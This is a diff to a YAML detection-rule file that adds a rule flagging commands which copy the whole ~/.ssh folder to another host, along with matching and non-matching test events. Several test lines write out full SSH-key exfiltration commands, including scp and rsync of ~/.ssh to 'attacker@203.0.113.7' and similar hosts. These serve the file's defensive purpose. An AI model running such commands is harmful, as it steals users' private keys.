@@ -3599,6 +3599,17 @@ hives:
                     - op: matches
                       path: event/COMMAND_LINE
                       re: '(^|\s)(-[^i\s]\S*|[^-\s]\S*)\s+[''"]?[^\s=''"-][^\s=]*\.ssh[/\\]id_[A-Za-z0-9_]*($|[^A-Za-z0-9_.])'
+                # The whole .ssh folder, or everything in it, as an operand
+                # ("scp -r -i ~/.ssh/id_ed25519 ~/.ssh host:"), whether or not
+                # a key is also given to -i.
+                - op: and
+                  rules:
+                    - op: matches
+                      path: event/COMMAND_LINE
+                      re: *reader_verbs
+                    - op: matches
+                      path: event/COMMAND_LINE
+                      re: '(^|[\s=''"])[^\s''"]*\.ssh[/\\]?\*?[''"]?($|\s)'
             # Other credential stores: cloud keys, saved git/GitHub logins,
             # .netrc, Docker and Kubernetes logins, database passwords, the
             # AI agents' own login files, the macOS Keychain files, the Windows
@@ -3926,6 +3937,18 @@ hives:
                   FILE_PATH: '/usr/bin/scp'
                 routing: *linux_process
             - - event:
+                  COMMAND_LINE: 'scp -r -i ~/.ssh/id_ed25519 ~/.ssh user@host:/tmp/'
+                  FILE_PATH: '/usr/bin/scp'
+                routing: *linux_process
+            - - event:
+                  COMMAND_LINE: 'scp -i ~/.ssh/id_ed25519 ~/.ssh/* user@host:/tmp/'
+                  FILE_PATH: '/usr/bin/scp'
+                routing: *mac_process
+            - - event:
+                  COMMAND_LINE: 'rsync -a -e "ssh -i /home/alice/.ssh/id_ed25519" /home/alice/.ssh/ backup@203.0.113.7:keys/'
+                  FILE_PATH: '/usr/bin/rsync'
+                routing: *linux_process
+            - - event:
                   COMMAND_LINE: 'scp -i /home/alice/.ssh/id_ed25519 /home/alice/.ssh/id_rsa attacker@203.0.113.7:keys'
                   FILE_PATH: '/usr/bin/scp'
                 routing: *linux_process
@@ -4187,6 +4210,22 @@ hives:
               - event:
                   COMMAND_LINE: 'ssh -i ~/.ssh/id_ed25519 host'
                   FILE_PATH: '/usr/bin/ssh'
+                routing: *linux_process
+              - event:
+                  COMMAND_LINE: 'ls -la ~/.ssh'
+                  FILE_PATH: '/usr/bin/ls'
+                routing: *linux_process
+              - event:
+                  COMMAND_LINE: 'chmod 700 ~/.ssh'
+                  FILE_PATH: '/usr/bin/chmod'
+                routing: *linux_process
+              - event:
+                  COMMAND_LINE: 'mkdir -p ~/.ssh'
+                  FILE_PATH: '/usr/bin/mkdir'
+                routing: *linux_process
+              - event:
+                  COMMAND_LINE: 'ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519'
+                  FILE_PATH: '/usr/bin/ssh-keygen'
                 routing: *linux_process
               - event:
                   COMMAND_LINE: 'python3 -c "print(open(''/home/alice/.ssh/id_ed25519.pub'').read())"'
